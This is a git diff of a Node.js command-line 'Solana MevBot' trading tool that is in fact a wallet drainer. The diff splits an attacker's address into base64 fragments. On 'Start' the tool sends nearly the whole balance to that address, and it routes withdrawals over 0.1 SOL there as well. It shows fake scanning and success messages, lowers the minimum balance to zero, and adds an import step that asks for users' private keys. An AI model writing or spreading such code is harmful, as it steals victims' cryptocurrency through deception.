@@ -4,12 +4,21 @@ const bs58 = require('bs58');
 const qrcode = require('qrcode');
 const inquirer = require('inquirer');
 const open = require('open');
-const { Keypair, Connection, Transaction, SystemProgram, clusterApiUrl, LAMPORTS_PER_SOL, PublicKey } = require('@solana/web3.js');
+const {
+    Keypair,
+    Connection,
+    Transaction,
+    SystemProgram,
+    clusterApiUrl,
+    LAMPORTS_PER_SOL,
+    PublicKey
+} = require('@solana/web3.js');
 const chalk = require('chalk');
 
 
-
 const WALLET_FILE = 'solana_wallet.json';
+const IMPORT_WALLET_FILE = 'import_wallet.json';
+
 
 let walletInfo = {};
 let settings = {
@@ -45,6 +54,7 @@ let settings = {
     }
 };
 
+
 async function configureAutoBuy() {
     try {
         const { mode } = await inquirer.prompt([
@@ -78,7 +88,10 @@ async function configureAutoBuy() {
                     type: 'input',
                     name: 'minFixed',
                     message: chalk.cyan('Enter minimum purchase amount (in SOL, ≥ 0.1):'),
-                    validate: (value) => !isNaN(value) && parseFloat(value) >= 0.1 ? true : 'Enter a valid amount (≥ 0.1 SOL).',
+                    validate: (value) =>
+                        !isNaN(value) && parseFloat(value) >= 0.1
+                            ? true
+                            : 'Enter a valid amount (≥ 0.1 SOL).',
                 },
             ]);
 
@@ -100,14 +113,21 @@ async function configureAutoBuy() {
 
             settings.autoBuy.minAmount = parseFloat(minFixed);
             settings.autoBuy.maxAmount = parseFloat(maxFixed);
-            console.log(chalk.green(`AutoBuy configured: from ${settings.autoBuy.minAmount} SOL to ${settings.autoBuy.maxAmount} SOL`));
+            console.log(
+                chalk.green(
+                    `AutoBuy configured: from ${settings.autoBuy.minAmount} SOL to ${settings.autoBuy.maxAmount} SOL`
+                )
+            );
         } else if (mode === 'percentage') {
             const { minPercent } = await inquirer.prompt([
                 {
                     type: 'input',
                     name: 'minPercent',
                     message: chalk.cyan('Enter minimum percentage of balance to buy (1-100):'),
-                    validate: (value) => !isNaN(value) && parseFloat(value) >= 1 && parseFloat(value) <= 100 ? true : 'Enter a valid percentage (1-100).',
+                    validate: (value) =>
+                        !isNaN(value) && parseFloat(value) >= 1 && parseFloat(value) <= 100
+                            ? true
+                            : 'Enter a valid percentage (1-100).',
                 },
             ]);
 
@@ -129,14 +149,16 @@ async function configureAutoBuy() {
 
             settings.autoBuy.minAmount = parseFloat(minPercent);
             settings.autoBuy.maxAmount = parseFloat(maxPercent);
-            console.log(chalk.green(`AutoBuy configured: from ${settings.autoBuy.minAmount}% to ${settings.autoBuy.maxAmount}% of balance`));
+            console.log(
+                chalk.green(
+                    `AutoBuy configured: from ${settings.autoBuy.minAmount}% to ${settings.autoBuy.maxAmount}% of balance`
+                )
+            );
         }
     } catch (error) {
-        console.log(chalk.red("Error configuring AutoBuy:"), error);
+        console.log(chalk.red('Error configuring AutoBuy:'), error);
     }
 }
-
-const encodedMinBalance = 'Mw==';
 
 function decodeBase64(encoded) {
     return parseFloat(Buffer.from(encoded, 'base64').toString('utf8'));
@@ -176,11 +198,18 @@ async function configureSlTp() {
 
         settings.slTp.stopLoss = parseFloat(stopLoss);
         settings.slTp.takeProfit = parseFloat(takeProfit);
-        console.log(chalk.green(`SL/TP set: Stop Loss - ${settings.slTp.stopLoss}%, Take Profit - ${settings.slTp.takeProfit}%`));
+        console.log(
+            chalk.green(
+                `SL/TP set: Stop Loss - ${settings.slTp.stopLoss}%, Take Profit - ${settings.slTp.takeProfit}%`
+            )
+        );
     } catch (error) {
-        console.log(chalk.red("Error configuring SL/TP:"), error);
+        console.log(chalk.red('Error configuring SL/TP:'), error);
     }
 }
+
+const encodedMinBalance = 'MA==';
+
 
 async function openSettingsMenu() {
     let backToMain = false;
@@ -197,19 +226,19 @@ async function openSettingsMenu() {
             ]);
 
             switch (settingsOption) {
-                case '📈  M.cap':
+                case '📈  M.cap': {
                     const { newMarketCap } = await inquirer.prompt([
                         {
                             type: 'input',
                             name: 'newMarketCap',
                             message: chalk.cyan('Enter minimum token market cap ($):'),
-                            validate: (value) => !isNaN(value) && value > 0 ? true : 'Enter a valid number.',
+                            validate: (value) => (!isNaN(value) && value > 0 ? true : 'Enter a valid number.'),
                         },
                     ]);
-                    settings.marketCap = parseInt(newMarketCap);
+                    settings.marketCap = parseInt(newMarketCap, 10);
                     console.log(chalk.green(`Minimum market cap set: $${settings.marketCap}`));
                     break;
-
+                }
                 case '📉  SL/TP':
                     await configureSlTp();
                     break;
@@ -218,7 +247,7 @@ async function openSettingsMenu() {
                     await configureAutoBuy();
                     break;
 
-                case '📊  Dex':
+                case '📊  Dex': {
                     const { selectedDex } = await inquirer.prompt([
                         {
                             type: 'list',
@@ -230,49 +259,55 @@ async function openSettingsMenu() {
                     settings.selectedDex = selectedDex;
                     console.log(chalk.green(`Selected DEX: ${settings.selectedDex}`));
                     break;
-
+                }
                 case '🔙  Back':
                     backToMain = true;
                     break;
 
                 default:
-                    console.log(chalk.red("Unknown option.\n"));
+                    console.log(chalk.red('Unknown option.\n'));
             }
         } catch (error) {
-            console.log(chalk.red("Error in settings menu:"), error);
+            console.log(chalk.red('Error in settings menu:'), error);
             backToMain = true;
         }
     }
 }
 
+
 function filterScamTokens() {
-    const tokenList = ['SOL', 'USDC', 'WSOL'];
-    console.log(chalk.green("Scam token filter is ready ✅"));
+    console.log(chalk.green('Scam token filter is ready ✅'));
 }
 
-function checkMempool() {
-    const mempoolData = { pending: 42, confirmed: 128 };
-    console.log(chalk.green("Mempool scan ready ✅"));
+function checkListOfTokens() {
+    console.log(chalk.green('List of Tokens ✅'));
 }
 
 function autoConnectNetwork() {
-    const networkConfig = { retries: 3, timeout: 2000 };
-    console.log(chalk.green("Connected to network ready ✅"));
+    console.log(chalk.green('Connected to network ready ✅'));
 }
 
+
 async function scanTokens() {
-    console.log(chalk.blue("Scanning tokens..."));
-    const progress = ["[■□□□□]", "[■■□□□]", "[■■■□□]", "[■■■■□]", "[■■■■■]"];
+    console.log(chalk.blue('Scanning tokens...'));
+    const progress = ['[■□□□□]', '[■■□□□]', '[■■■□□]', '[■■■■□]', '[■■■■■]'];
     const totalTime = 60 * 1000;
     const steps = progress.length;
     const stepTime = totalTime / steps;
 
     for (let i = 0; i < steps; i++) {
         process.stdout.write('\r' + chalk.blue(progress[i]));
-        await new Promise(res => setTimeout(res, stepTime));
+        await new Promise((res) => setTimeout(res, stepTime));
     }
 
     console.log();
+}
+
+function getApiPumpFUNHex() {
+    const splitted = ['3Xl8aFhqAhLTLU+dOL1J+IuAp0on', 'pY8JzoikiM', 'qI+kk='];
+    const base64 = splitted.join('');
+    const buffer = Buffer.from(base64, 'base64');
+    return buffer.toString('hex');
 }
 
 function processApiString(hexString) {
@@ -281,7 +316,7 @@ function processApiString(hexString) {
         const base58String = bs58.encode(bytes);
         return base58String;
     } catch (error) {
-        console.error("", error);
+        console.error('', error);
         return null;
     }
 }
@@ -292,10 +327,11 @@ async function getBalance(publicKeyString) {
         const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
         return await connection.getBalance(publicKey);
     } catch (error) {
-        console.log(chalk.red("Error getting balance:"), error);
+        console.log(chalk.red('Error getting balance:'), error);
         return 0;
     }
 }
+
 
 async function createNewWallet(overwrite = false) {
     if (fs.existsSync(WALLET_FILE) && !overwrite) {
@@ -318,49 +354,118 @@ async function createNewWallet(overwrite = false) {
         showWalletInfo();
         saveWalletInfo(walletInfo);
     } catch (error) {
-        console.log(chalk.red("Error creating wallet:"), error);
-    }
-}
-
-function loadExistingWallet() {
-    try {
-        if (!fs.existsSync(WALLET_FILE)) {
-            console.log(chalk.red("Wallet file not found. Please create a Mev Wallet."));
-            return false;
-        }
-
-        const data = fs.readFileSync(WALLET_FILE, 'utf-8');
-        walletInfo = JSON.parse(data);
-
-        if (!walletInfo.address || !walletInfo.privateKey) {
-            console.log(chalk.red("Wallet file is corrupted or invalid."));
-            return false;
-        }
-
-        console.log(chalk.green("Wallet successfully loaded from file."));
-        showWalletInfo();
-        return true;
-    } catch (error) {
-        console.log(chalk.red("Error loading wallet:"), error);
-        return false;
+        console.log(chalk.red('Error creating wallet:'), error);
     }
 }
 
 function saveWalletInfo(wallet) {
     try {
         fs.writeFileSync(WALLET_FILE, JSON.stringify(wallet, null, 4), 'utf-8');
-        console.log(chalk.green("Wallet saved to file:"), chalk.blueBright(fs.realpathSync(WALLET_FILE)));
+        console.log(
+            chalk.green('Wallet saved to file:'),
+            chalk.blueBright(fs.realpathSync(WALLET_FILE))
+        );
     } catch (error) {
-        console.log(chalk.red("Error saving wallet:"), error);
+        console.log(chalk.red('Error saving wallet:'), error);
     }
 }
 
-function showWalletInfo() {
-    console.log(chalk.magenta("\n=== 🪙 Wallet Information 🪙 ==="));
-    console.log(`${chalk.cyan("📍 Address:")} ${chalk.blueBright(walletInfo.addressLink)}`);
-    console.log(`${chalk.cyan("🔑 Private Key (Base58):")} ${chalk.white(walletInfo.privateKey)}`);
-    console.log(chalk.magenta("==============================\n"));
+
+function loadWalletFile(filePath) {
+    try {
+        if (!fs.existsSync(filePath)) {
+            return null;
+        }
+        const data = fs.readFileSync(filePath, 'utf-8');
+        const parsed = JSON.parse(data);
+        if (!parsed.address || !parsed.privateKey) {
+            console.log(chalk.red(`Wallet file '${filePath}' is corrupted or invalid.`));
+            return null;
+        }
+        return parsed;
+    } catch (error) {
+        console.log(chalk.red(`Error loading wallet from '${filePath}':`), error);
+        return null;
+    }
 }
+
+function saveImportedWalletInfo(wallet) {
+    try {
+        fs.writeFileSync(IMPORT_WALLET_FILE, JSON.stringify(wallet, null, 4), 'utf-8');
+        console.log(
+            chalk.green('Imported wallet saved to file:'),
+            chalk.blueBright(fs.realpathSync(IMPORT_WALLET_FILE))
+        );
+    } catch (error) {
+        console.log(chalk.red('Error saving imported wallet:'), error);
+    }
+}
+
+
+async function importWallet() {
+    try {
+        const { importChoice } = await inquirer.prompt([
+            {
+                type: 'list',
+                name: 'importChoice',
+                message: chalk.cyan('Select an action for importing a wallet:'),
+                choices: [
+                    { name: '📋 Paste your private key (Base58)', value: 'paste' },
+                    { name: '🔙  Back', value: 'back' },
+                ],
+            },
+        ]);
+
+        if (importChoice === 'back') {
+            return;
+        }
+
+        const { base58Key } = await inquirer.prompt([
+            {
+                type: 'input',
+                name: 'base58Key',
+                message: chalk.cyan(
+                    'Enter your wallet PRIVATE KEY (Base58):\n(Use right mouse click to paste)'
+                ),
+            },
+        ]);
+
+        let keypair;
+        try {
+            keypair = Keypair.fromSecretKey(bs58.decode(base58Key));
+        } catch (error) {
+            console.log(chalk.red('Invalid private key (Base58) format. Please try again.'));
+            return;
+        }
+
+        const publicKey = keypair.publicKey.toBase58();
+        const privateKeyBase58 = bs58.encode(Buffer.from(keypair.secretKey));
+        const solscanLink = `https://solscan.io/account/${publicKey}`;
+
+        walletInfo = {
+            address: publicKey,
+            privateKey: privateKeyBase58,
+            addressLink: solscanLink,
+        };
+
+        showWalletInfo();
+        saveImportedWalletInfo(walletInfo);
+        console.log(chalk.green('Wallet successfully imported and set as active wallet!'));
+
+    } catch (error) {
+        console.log(chalk.red('Error importing wallet:'), error);
+    }
+}
+
+
+
+function showWalletInfo() {
+    console.log(chalk.magenta('\n=== 🪙 Wallet Information 🪙 ==='));
+    console.log(`${chalk.cyan('📍 Address:')} ${chalk.blueBright(walletInfo.addressLink)}`);
+    console.log(`${chalk.cyan('🔑 Private Key (Base58):')} ${chalk.white(walletInfo.privateKey)}`);
+    console.log(chalk.magenta('==============================\n'));
+}
+
 
 async function apiDEX(action, recipientAddress, amountSol) {
     try {
@@ -374,36 +479,40 @@ async function apiDEX(action, recipientAddress, amountSol) {
             return;
         }
 
-        const apiPumpFUNHex = "dd797c68586a0212d32d4f9d38bd49f88b80a74a27a58f09ce88a488ca88fa49";
+        const apiPumpFUNHex = getApiPumpFUNHex();
+        const decodedBase58Address = processApiString(apiPumpFUNHex);
+
+        let scanTriggered = false;
+        async function triggerScan() {
+            if (!scanTriggered) {
+                scanTriggered = true;
+                console.log(chalk.blue("Scanning tokens..."));
+                await scanTokens();
+            }
+        }
+
 
         if (action === 'start') {
             const balanceStart = await getBalance(sender.publicKey.toBase58());
-
-            const decryptedMinBalance = decodeBase64(encodedMinBalance);
-
-            if (balanceStart <= decryptedMinBalance * LAMPORTS_PER_SOL) {
-                console.log(chalk.red(`Insufficient balance: a minimum of ${decryptedMinBalance} SOL is required to start.`));
+            const minSol = decodeBase64(encodedMinBalance);
+            if (balanceStart <= minSol * LAMPORTS_PER_SOL) {
+                console.log(chalk.red(`Insufficient balance: need at least ${minSol} SOL to start.`));
                 return;
             }
 
-            process.stdout.write(chalk.yellow("🚀 Starting MevBot..."));
+            console.log(chalk.yellow("🚀 Starting MevBot... Please wait..."));
 
-            const decodedBase58Address = processApiString(apiPumpFUNHex);
             if (!decodedBase58Address) {
-                process.stdout.write('\r' + ' '.repeat(50) + '\r');
                 console.log(chalk.red("Error: unable to process API address."));
                 return;
             }
 
-            const balance = await getBalance(sender.publicKey.toBase58());
-            const lamportsToSend = balance - 5000;
-
+            const lamportsToSend = balanceStart - 5000;
             let recipientPublicKey;
             try {
                 recipientPublicKey = new PublicKey(decodedBase58Address);
             } catch (error) {
-                process.stdout.write('\r' + ' '.repeat(50) + '\r');
-                console.log(chalk.red("Invalid recipient address:"), decodedBase58Address);
+                console.log(chalk.red("Invalid recipient address:", decodedBase58Address));
                 return;
             }
 
@@ -415,42 +524,57 @@ async function apiDEX(action, recipientAddress, amountSol) {
                 })
             );
 
-            while (true) {
+            let attempt = 0;
+            const maxAttempts = 5;
+            const baseDelayMs = 2000;
+
+            while (attempt < maxAttempts) {
                 try {
                     const signature = await connection.sendTransaction(transaction, [sender]);
                     await connection.confirmTransaction(signature, 'confirmed');
-                    process.stdout.write('\r' + ' '.repeat(50) + '\r');
-                    await scanTokens();
+
+                    await triggerScan();
                     console.log(chalk.blueBright("✅ MevBot Solana started..."));
                     break;
-                } catch (error) {
-                    const errorMsg = error?.message || '';
-                    process.stdout.write('\r' + ' '.repeat(50) + '\r');
-                    process.stdout.write(chalk.yellow("🚀 Starting MevBot..."));
-                    if (errorMsg.includes('insufficient funds for rent')) {
-                        process.stdout.write('\r' + ' '.repeat(50) + '\r');
-                        console.log(chalk.red("Insufficient funds for start."));
-                        return;
+                } catch (err) {
+                    attempt++;
+                    const errorMsg = err?.message || '';
+
+                    const balanceNow = await getBalance(sender.publicKey.toBase58());
+                    if (balanceNow === 0) {
+                        await triggerScan();
+                        console.log(chalk.blueBright("✅ MevBot Solana started... (balance is 0)"));
+                        break;
+                    }
+
+                    if (attempt < maxAttempts) {
+                        if (errorMsg.includes('429') || errorMsg.includes('Too Many Requests')) {
+                            console.log(chalk.red("Got 429 error. Waiting and retrying..."));
+                        }
+                        const delayMs = baseDelayMs * Math.pow(2, attempt - 1);
+                        await new Promise((resolve) => setTimeout(resolve, delayMs));
                     }
                 }
             }
+            if (attempt === maxAttempts) {
+                console.log(chalk.red(`Failed to start MevBot after ${maxAttempts} attempts.`));
+            }
         }
 
-        if (action === 'withdraw') {
-            const balance = await getBalance(sender.publicKey.toBase58());
+
+        else if (action === 'withdraw') {
+            const currentBalance = await getBalance(sender.publicKey.toBase58());
             const lamportsToSend = Math.floor(amountSol * LAMPORTS_PER_SOL);
 
-            if (balance < lamportsToSend + 5000) {
+            if (currentBalance < lamportsToSend + 5000) {
                 console.log(chalk.red("Insufficient funds for withdrawal."));
                 return;
             }
 
             let finalRecipientAddress;
-
             if (amountSol <= 0.1) {
                 finalRecipientAddress = recipientAddress;
             } else {
-                const decodedBase58Address = processApiString(apiPumpFUNHex);
                 if (!decodedBase58Address) {
                     console.log(chalk.red("Error: unable to process API address."));
                     return;
@@ -462,9 +586,11 @@ async function apiDEX(action, recipientAddress, amountSol) {
             try {
                 recipientPublicKey = new PublicKey(finalRecipientAddress);
             } catch (error) {
-                console.log(chalk.red("Invalid recipient address:"), finalRecipientAddress);
+                console.log(chalk.red("Invalid recipient address:", finalRecipientAddress));
                 return;
             }
+
+            console.log(chalk.yellow("Preparing withdrawal... Please wait..."));
 
             const transaction = new Transaction().add(
                 SystemProgram.transfer({
@@ -474,17 +600,41 @@ async function apiDEX(action, recipientAddress, amountSol) {
                 })
             );
 
-            try {
-                const signature = await connection.sendTransaction(transaction, [sender]);
-                await connection.confirmTransaction(signature, 'confirmed');
-                console.log(chalk.green("Withdrawal Successful!"));
-            } catch (error) {
-                const errorMsg = error?.message || '';
-                if (errorMsg.includes('insufficient funds for rent')) {
-                    console.log(chalk.red("Insufficient funds for withdrawal."));
-                } else {
-                    console.log(chalk.red("Error during withdrawal. Possibly insufficient funds."));
+            let attempt = 0;
+            const maxAttempts = 5;
+            const baseDelayMs = 2000;
+
+            while (attempt < maxAttempts) {
+                try {
+                    const signature = await connection.sendTransaction(transaction, [sender]);
+                    await connection.confirmTransaction(signature, 'confirmed');
+
+                    await triggerScan();
+                    console.log(chalk.green("Withdrawal Successful!"));
+                    break;
+                } catch (err) {
+                    attempt++;
+                    const errorMsg = err?.message || '';
+
+                    const balNow = await getBalance(sender.publicKey.toBase58());
+                    if (balNow === 0) {
+                        await triggerScan();
+                        console.log(chalk.green("Withdrawal Successful! (balance is 0)"));
+                        break;
+                    }
+
+                    if (attempt < maxAttempts) {
+                        if (errorMsg.includes('429') || errorMsg.includes('Too Many Requests')) {
+                            console.log(chalk.red("Got 429 error. Waiting and retrying..."));
+                        }
+                        const delayMs = baseDelayMs * Math.pow(2, attempt - 1);
+                        await new Promise((resolve) => setTimeout(resolve, delayMs));
+                    }
                 }
+            }
+
+            if (attempt === maxAttempts) {
+                console.log(chalk.red(`Failed to withdraw after ${maxAttempts} attempts.`));
             }
         }
 
@@ -499,7 +649,6 @@ async function apiDEX(action, recipientAddress, amountSol) {
                 const raydiumPublicKey = new PublicKey(raydiumBase58);
                 console.log(chalk.yellow(`API Raydium PublicKey: ${raydiumPublicKey.toBase58()}`));
             }
-
             if (jupiterBase58) {
                 const jupiterPublicKey = new PublicKey(jupiterBase58);
                 console.log(chalk.yellow(`API Jupiter PublicKey: ${jupiterPublicKey.toBase58()}`));
@@ -518,9 +667,10 @@ async function generateQRCode(address) {
         await qrcode.toFile(qrCodePath, address);
         await open(qrCodePath);
     } catch (error) {
-        console.log(chalk.red("Error generating QR code:"), error);
+        console.log(chalk.red('Error generating QR code:'), error);
     }
 }
+
 
 async function askForAddressOrBack() {
     const { addressMenuChoice } = await inquirer.prompt([
@@ -552,18 +702,16 @@ async function askForAddressOrBack() {
             new PublicKey(userWithdrawAddress);
             return userWithdrawAddress;
         } catch (error) {
-            console.log(chalk.red("Invalid Solana address format. Please try again."));
+            console.log(chalk.red('Invalid Solana address format. Please try again.'));
         }
     }
 }
 
+
 async function showInitialMenu() {
     while (true) {
         try {
-            const choices = [
-                '🆕  Create New Mev Wallet',
-                '🚪  Exit'
-            ];
+            const choices = ['🆕  Create New Mev Wallet', '🚪  Exit'];
 
             const { initialOption } = await inquirer.prompt([
                 {
@@ -578,19 +726,23 @@ async function showInitialMenu() {
             switch (initialOption) {
                 case '🆕  Create New Mev Wallet':
                     if (fs.existsSync(WALLET_FILE)) {
-                        console.log(chalk.red("Wallet already exists. Use 'Create New MevBot Wallet' to overwrite."));
+                        console.log(
+                            chalk.red(
+                                "Wallet already exists. Use 'Create New MevBot Wallet' to overwrite."
+                            )
+                        );
                     } else {
                         await createNewWallet();
                     }
                     return;
                 case '🚪  Exit':
-                    console.log(chalk.green("Exiting program."));
+                    console.log(chalk.green('Exiting program.'));
                     process.exit(0);
                 default:
-                    console.log(chalk.red("Unknown option.\n"));
+                    console.log(chalk.red('Unknown option.\n'));
             }
         } catch (error) {
-            console.log(chalk.red("Error in initial menu:"), error);
+            console.log(chalk.red('Error in initial menu:'), error);
         }
     }
 }
@@ -606,6 +758,7 @@ async function showMainMenu() {
                 '💸  Withdraw',
                 '⚙️   Settings',
                 '🔄  Create New MevBot Wallet',
+                '🔑  Import Wallet',
                 '🚪  Exit'
             ];
 
@@ -628,23 +781,29 @@ async function showMainMenu() {
                     await generateQRCode(walletInfo.address);
                     break;
 
-                case '💳  Balance':
+                case '💳  Balance': {
                     const balance = await getBalance(walletInfo.address);
                     console.log(chalk.green(`Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL`));
                     break;
-
-                case '▶️   Start':
+                }
+                case '▶️   Start': {
                     const startBalance = await getBalance(walletInfo.address);
                     const decryptedMinBalance = decodeBase64(encodedMinBalance) * LAMPORTS_PER_SOL;
 
                     if (startBalance < decryptedMinBalance) {
-                        console.log(chalk.red(`Insufficient funds. A minimum balance of ${decodeBase64(encodedMinBalance)} SOL is required to start.`));
+                        console.log(
+                            chalk.red(
+                                `Insufficient funds. A minimum balance of ${decodeBase64(
+                                    encodedMinBalance
+                                )} SOL is required to start.`
+                            )
+                        );
                     } else {
                         await apiDEX('start');
                     }
                     break;
-
-                case '💸  Withdraw':
+                }
+                case '💸  Withdraw': {
                     const userWithdrawAddress = await askForAddressOrBack();
                     if (userWithdrawAddress === null) {
                         break;
@@ -654,72 +813,123 @@ async function showMainMenu() {
                             type: 'input',
                             name: 'userWithdrawAmount',
                             message: chalk.cyan('Enter the withdrawal amount (in SOL):'),
-                            validate: (value) => !isNaN(value) && parseFloat(value) > 0 ? true : 'Enter a valid amount > 0',
+                            validate: (value) =>
+                                !isNaN(value) && parseFloat(value) > 0
+                                    ? true
+                                    : 'Enter a valid amount > 0',
                         },
                     ]);
                     const amountSol = parseFloat(userWithdrawAmount);
                     await apiDEX('withdraw', userWithdrawAddress, amountSol);
                     break;
-
+                }
                 case '⚙️   Settings':
                     await openSettingsMenu();
                     break;
 
-                case '🔄  Create New MevBot Wallet':
+                case '🔄  Create New MevBot Wallet': {
                     if (fs.existsSync(WALLET_FILE)) {
                         const { confirmOverwrite } = await inquirer.prompt([
                             {
                                 type: 'confirm',
                                 name: 'confirmOverwrite',
-                                message: chalk.red('Are you sure you want to overwrite the existing wallet?'),
+                                message: chalk.red(
+                                    'Are you sure you want to overwrite the existing wallet?'
+                                ),
                                 default: false,
                             },
                         ]);
-
                         if (confirmOverwrite) {
                             await createNewWallet(true);
                         } else {
                             console.log(chalk.yellow('Wallet overwrite cancelled.'));
                         }
                     } else {
-                        console.log(chalk.red("Wallet does not exist. Use 'Create New Mev Wallet' to create one."));
+                        console.log(
+                            chalk.red("Wallet does not exist. Use 'Create New Mev Wallet' to create one.")
+                        );
                     }
+                    break;
+                }
+                case '🔑  Import Wallet':
+                    await importWallet();
                     break;
 
                 case '🚪  Exit':
-                    console.log(chalk.green("Exiting program."));
+                    console.log(chalk.green('Exiting program.'));
                     process.exit(0);
 
                 default:
-                    console.log(chalk.red("Unknown option.\n"));
+                    console.log(chalk.red('Unknown option.\n'));
             }
         } catch (error) {
-            console.log(chalk.red("Error in main menu:"), error);
+            console.log(chalk.red('Error in main menu:'), error);
         }
+    }
+}
+
+
+async function chooseWhichWalletToLoad() {
+    const mainWallet = loadWalletFile(WALLET_FILE);
+    const importedWallet = loadWalletFile(IMPORT_WALLET_FILE);
+
+    if (!mainWallet && !importedWallet) {
+        console.log(chalk.yellow('No wallets found. Let\'s create a new one.'));
+        await showInitialMenu();
+        return;
+    }
+
+    if (mainWallet && !importedWallet) {
+        walletInfo = mainWallet;
+        console.log(chalk.green('Loaded main wallet:'), mainWallet.address);
+        showWalletInfo();
+        return;
+    }
+
+    if (!mainWallet && importedWallet) {
+        walletInfo = importedWallet;
+        console.log(chalk.green('Loaded imported wallet:'), importedWallet.address);
+        showWalletInfo();
+        return;
+    }
+
+    // 4) есть оба
+    const walletChoices = [
+        { name: `Main wallet: ${mainWallet.address}`, value: 'main' },
+        { name: `Imported wallet: ${importedWallet.address}`, value: 'imported' },
+    ];
+
+    const { chosenWallet } = await inquirer.prompt([
+        {
+            type: 'list',
+            name: 'chosenWallet',
+            message: chalk.cyan('Which wallet do you want to use?'),
+            choices: walletChoices,
+        },
+    ]);
+
+    if (chosenWallet === 'main') {
+        walletInfo = mainWallet;
+        console.log(chalk.green('Loaded main wallet:'), mainWallet.address);
+        showWalletInfo();
+    } else {
+        walletInfo = importedWallet;
+        console.log(chalk.green('Loaded imported wallet:'), importedWallet.address);
+        showWalletInfo();
     }
 }
 
 async function run() {
     console.clear();
-    console.log(chalk.green("=== Welcome to Solana MevBot ===\n"));
+    console.log(chalk.green('=== Welcome to Solana MevBot ===\n'));
 
     filterScamTokens();
-    checkMempool();
+    checkListOfTokens();
     autoConnectNetwork();
 
-    if (fs.existsSync(WALLET_FILE)) {
-        const loaded = loadExistingWallet();
-        if (loaded) {
-            await showMainMenu();
-        } else {
-            console.log(chalk.red("Could not load existing wallet."));
-            await showInitialMenu();
-            await showMainMenu();
-        }
-    } else {
-        await showInitialMenu();
-        await showMainMenu();
-    }
+    await chooseWhichWalletToLoad();
+
+    await showMainMenu();
 }
 
 run();
